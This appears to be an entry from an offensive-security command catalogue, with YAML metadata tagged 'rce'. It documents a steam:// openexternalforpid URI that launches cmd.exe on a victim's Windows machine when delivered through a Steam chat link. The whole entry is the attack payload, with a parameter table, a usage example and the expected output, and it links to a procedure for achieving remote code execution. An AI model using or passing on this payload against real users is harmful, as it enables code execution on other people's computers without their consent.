---
data: 'steam://openexternalforpid/10400/file:///C:/Windows/cmd.exe'
tags:
  - steam
  - rce
type: command
executor: bash
platforms:
  - Windows
id: bdde5231-3b6f-475c-9b57-65b3a9ac6146
created_at: '2025-12-14T00:11:25.279Z'
updated_at: '2025-12-14T00:11:25.279Z'
verified: false
validated: true
submitted: true
---
# steam-openexternalforpid

## Command

```bash
steam://openexternalforpid/10400/file:///C:/Windows/cmd.exe
```

## Description

Uses openexternalforpid to run cmd.exe on the victim's machine, delivered via chat URL tag.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `pid` | 10400 | Yes |
| `path` | file:///C:/Windows/cmd.exe | Yes |

## Examples

### Basic Usage

```bash
steam://openexternalforpid/10400/file:///C:/Windows/cmd.exe
```

## Expected Output

Opens cmd.exe.

## Related

- [[procedures/Achieving-RCE-via-Openexternalforpid]]
- [[commands/steam-console]]
